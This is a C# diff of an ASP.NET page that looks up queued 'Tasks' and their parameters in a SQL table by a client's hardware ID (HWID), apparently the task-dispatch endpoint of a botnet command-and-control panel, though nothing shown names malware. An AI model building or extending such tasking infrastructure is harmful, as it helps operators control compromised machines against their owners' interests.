@@ -7,31 +7,49 @@ public partial class _Default : System.Web.UI.Page
     {
         try
         {
-            string HWID = Request.QueryString["HWID"];
-            int Amount;
-            string Type = "nop";
-            int i = 0;
-            FooSpan.InnerText = ";";
-
             using (SqlConnection conn = new SqlConnection(Settings.sqlConn))
             {
                 conn.Open();
-                using (SqlCommand cmd = new SqlCommand("SELECT Count(*) FROM Tasks WHERE HWID = @HWID", conn))
+                string Type = Request.QueryString["Type"];
+                string HWID = Request.QueryString["HWID"];
+                FooSpan.InnerText = Type;
+                if (Type == null || Type == "")
                 {
-                    cmd.Parameters.AddWithValue("HWID", HWID);
-                    Amount = (int)cmd.ExecuteScalar();
-                }
 
-                do
-                {
-                    i++;
-                    using (SqlCommand cmd = new SqlCommand("SELECT Type FROM Tasks WHERE HWID = @HWID", conn))
+                    int Amount;
+                    string type = "nop";
+                    FooSpan.InnerText = ";";
+
+                    using (SqlCommand cmd = new SqlCommand("SELECT Count(*) FROM Tasks WHERE HWID = @HWID", conn))
                     {
                         cmd.Parameters.AddWithValue("HWID", HWID);
-                        Type = cmd.ExecuteScalar().ToString();
-                        FooSpan.InnerText += Type + ";";
+                        Amount = (int)cmd.ExecuteScalar();
                     }
-                } while (i > Amount);
+
+                    for (int i = 1; i <= Amount; i++)
+                    {
+                        using (SqlCommand cmd = new SqlCommand("select type from (select type,DENSE_RANK() over (order by type) as rownum from Tasks where hwid = @HWID) as tbl where tbl.rownum = @i", conn))
+                        {
+                            cmd.Parameters.AddWithValue("HWID", HWID);
+                            cmd.Parameters.AddWithValue("i", i);
+                            type = cmd.ExecuteScalar().ToString();
+                            FooSpan.InnerText += type + ";";
+                        }
+                    }
+                }
+
+                else
+                {
+                    FooSpan.InnerText = ";";
+                    string par1;
+                    using (SqlCommand cmd = new SqlCommand("select Parameter1 from Tasks where HWID = @HWID and Type = @Type", conn))
+                    {
+                        cmd.Parameters.AddWithValue("Type", Type);
+                        cmd.Parameters.AddWithValue("HWID", HWID);
+                        par1 = (string)cmd.ExecuteScalar();
+                        FooSpan.InnerText += par1 + ";";
+                    }
+                }
             }
         }
         catch { }
